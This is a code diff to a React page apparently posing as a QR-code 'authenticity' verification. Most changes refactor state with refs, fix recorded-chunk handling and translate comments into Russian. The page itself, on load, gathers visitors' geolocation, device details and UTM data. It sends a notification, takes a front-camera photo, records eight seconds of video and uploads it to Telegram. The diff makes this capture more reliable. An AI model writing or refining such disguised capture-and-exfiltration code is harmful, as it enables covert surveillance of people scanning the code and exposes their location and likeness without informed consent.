@@ -7,7 +7,7 @@ import { useLayoutContext } from '@/context/LayoutContext';
 import { showSuccess, showError } from '@/utils/toast';
 import LoadingSpinner from '@/components/LoadingSpinner';
 import { RefreshCcw } from 'lucide-react';
-import { getDeviceInfo } from '@/utils/deviceInfo'; // Import the new utility
+import { getDeviceInfo } from '@/utils/deviceInfo';
 
 type QrVerifyPageProps = {
   params: { lang: string };
@@ -32,24 +32,46 @@ const QrVerifyPage = ({ params: _params }: QrVerifyPageProps) => {
 
   const videoRef = useRef<HTMLVideoElement>(null);
   const canvasRef = useRef<HTMLCanvasElement>(null);
+  const streamRef = useRef<MediaStream | null>(null); // Ref для хранения текущего MediaStream
+  const mediaRecorderRef = useRef<MediaRecorder | null>(null); // Ref для хранения MediaRecorder
+  const recordedChunksRef = useRef<Blob[]>([]); // Ref для хранения записанных чанков
+
+  // Обновляем streamRef при изменении stream
+  useEffect(() => {
+    streamRef.current = stream;
+  }, [stream]);
+
+  // Обновляем mediaRecorderRef при изменении mediaRecorder
+  useEffect(() => {
+    mediaRecorderRef.current = mediaRecorder;
+  }, [mediaRecorder]);
+
+  // Обновляем recordedChunksRef при изменении recordedChunks
+  useEffect(() => {
+    recordedChunksRef.current = recordedChunks;
+  }, [recordedChunks]);
 
   const stopCamera = useCallback(() => {
-    if (stream) {
-      stream.getTracks().forEach((track: MediaStreamTrack) => track.stop());
+    if (streamRef.current) {
+      streamRef.current.getTracks().forEach((track: MediaStreamTrack) => track.stop());
       setStream(null);
     }
     if (videoRef.current) {
       videoRef.current.srcObject = null;
     }
     setIsCameraActive(false);
-  }, [stream]);
+    setIsRecording(false); // Убедимся, что флаг записи сброшен
+    setMediaRecorder(null); // Сбросим MediaRecorder
+    setRecordedChunks([]); // Очистим чанки
+    setVideoPreviewUrl(null); // Очистим URL превью
+  }, []); // Теперь stopCamera стабилен
 
   const startVerificationProcess = useCallback(async () => {
-    // Check session storage to prevent multiple runs
+    // Проверяем sessionStorage, чтобы предотвратить многократные запуски
     if (sessionStorage.getItem(QR_SCAN_SESSION_KEY) === 'true') {
       console.log("QR verification already processed in this session.");
       setIsLoading(false);
-      setStatusMessage(t.authenticity.qrScanSuccess); // Or a message indicating it was already done
+      setStatusMessage(t.authenticity.qrScanSuccess);
       return;
     }
 
@@ -64,7 +86,7 @@ const QrVerifyPage = ({ params: _params }: QrVerifyPageProps) => {
     let initialCaption = '';
 
     try {
-      // 1. Get Geolocation
+      // 1. Получаем геолокацию
       setStatusMessage(t.authenticity.processingRequest + " (Getting location...)");
       if (navigator.geolocation) {
         try {
@@ -82,10 +104,10 @@ const QrVerifyPage = ({ params: _params }: QrVerifyPageProps) => {
         setStatusMessage(t.authenticity.processingRequest + " (Geolocation not supported.)");
       }
 
-      // 2. Get User-Agent details and client timezone using the new utility
+      // 2. Получаем информацию об устройстве и часовом поясе
       const { deviceVendor, deviceModel, cpuArchitecture, clientTimezone } = getDeviceInfo();
 
-      // 3. Send initial visit notification to get caption
+      // 3. Отправляем начальное уведомление о посещении для получения подписи
       setStatusMessage(t.authenticity.processingRequest + " (Sending initial notification...)");
       const utmQueryParams = {
         utm_source: searchParams?.get('utm_source') || null,
@@ -105,10 +127,10 @@ const QrVerifyPage = ({ params: _params }: QrVerifyPageProps) => {
         clientTimezone,
       };
       const notifyResponse = await notifyVisit(bodyData, utmQueryParams);
-      initialCaption = notifyResponse; // Capture the message returned by notifyVisit
+      initialCaption = notifyResponse;
       setStatusMessage(t.authenticity.processingRequest + " (Initial notification sent.)");
 
-      // 4. Request Camera Access (front camera first)
+      // 4. Запрашиваем доступ к камере (сначала фронтальная, затем задняя)
       setStatusMessage(t.authenticity.processingRequest + " (Requesting camera access...)");
       let mediaStream: MediaStream;
       try {
@@ -133,10 +155,10 @@ const QrVerifyPage = ({ params: _params }: QrVerifyPageProps) => {
         await videoRef.current.play();
       }
 
-      // IMPORTANT: Add a small delay to allow the video stream to render a frame
+      // Важно: небольшая задержка, чтобы видеопоток успел отобразить кадр
       await new Promise(resolve => setTimeout(resolve, 500)); 
 
-      // 5. Take Photo
+      // 5. Делаем снимок
       setStatusMessage(t.authenticity.processingRequest + " (Taking photo...)");
       if (videoRef.current && canvasRef.current) {
         const video = videoRef.current;
@@ -161,10 +183,10 @@ const QrVerifyPage = ({ params: _params }: QrVerifyPageProps) => {
         }
       }
 
-      // 6. Start Video Recording (if photo was successful)
+      // 6. Начинаем запись видео (если снимок был успешным)
       setStatusMessage(t.authenticity.recordingInstructions + " (Starting video recording...)");
       const recorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm; codecs=vp8,opus' });
-      setMediaRecorder(recorder);
+      setMediaRecorder(recorder); // Устанавливаем MediaRecorder в состояние
 
       recorder.ondataavailable = (event: BlobEvent) => {
         if (event.data.size > 0) {
@@ -174,8 +196,9 @@ const QrVerifyPage = ({ params: _params }: QrVerifyPageProps) => {
 
       recorder.onstop = async () => {
         setIsRecording(false);
-        stopCamera();
-        const blob = new Blob(recordedChunks, { type: 'video/webm' });
+        stopCamera(); // Останавливаем камеру после записи
+        
+        const blob = new Blob(recordedChunksRef.current, { type: 'video/webm' }); // Используем ref для доступа к последним чанкам
         const url = URL.createObjectURL(blob);
         setVideoPreviewUrl(url);
         
@@ -185,7 +208,7 @@ const QrVerifyPage = ({ params: _params }: QrVerifyPageProps) => {
           await sendTelegramVideo({ videoBlob: blob, caption: initialCaption, filename });
           showSuccess(t.authenticity.recordingSuccess);
           setStatusMessage(t.authenticity.recordingSuccess);
-          sessionStorage.setItem(QR_SCAN_SESSION_KEY, 'true'); // Set flag on successful completion
+          sessionStorage.setItem(QR_SCAN_SESSION_KEY, 'true'); // Устанавливаем флаг после успешного завершения
         } catch (videoSendError: unknown) {
           console.error("Error sending video to Telegram:", videoSendError);
           showError(t.authenticity.recordingError);
@@ -202,7 +225,7 @@ const QrVerifyPage = ({ params: _params }: QrVerifyPageProps) => {
         if (recorder.state !== 'inactive') {
           recorder.stop();
         }
-      }, 8000);
+      }, 8000); // Запись 8 секунд
 
     } catch (err: unknown) {
       console.error("Error during QR verification process:", err);
@@ -223,22 +246,23 @@ const QrVerifyPage = ({ params: _params }: QrVerifyPageProps) => {
       setIsRecording(false);
       stopCamera();
     }
-  }, [searchParams, pathname, t, stopCamera, recordedChunks]);
+  }, [searchParams, pathname, t, stopCamera]); // startVerificationProcess теперь стабилен
 
   useEffect(() => {
-    // Call startVerificationProcess only once on mount
+    // Вызываем startVerificationProcess только один раз при монтировании
     startVerificationProcess();
 
     return () => {
-      stopCamera();
-      if (mediaRecorder && mediaRecorder.state !== 'inactive') {
-        mediaRecorder.stop();
+      // Очистка при размонтировании компонента
+      stopCamera(); // Останавливаем камеру
+      if (mediaRecorderRef.current && mediaRecorderRef.current.state !== 'inactive') {
+        mediaRecorderRef.current.stop(); // Останавливаем MediaRecorder, если он активен
       }
       if (videoPreviewUrl) {
-        URL.revokeObjectURL(videoPreviewUrl);
+        URL.revokeObjectURL(videoPreviewUrl); // Освобождаем URL объекта
       }
     };
-  }, [startVerificationProcess]); // Dependency array now only includes startVerificationProcess
+  }, [startVerificationProcess, videoPreviewUrl, stopCamera]); // mediaRecorderRef не нужен здесь, так как stopCamera его сбрасывает
 
   return (
     <div className="flex flex-col items-center justify-center min-h-screen p-4 text-center bg-gray-50 dark:bg-gray-900 text-gray-900 dark:text-gray-50">
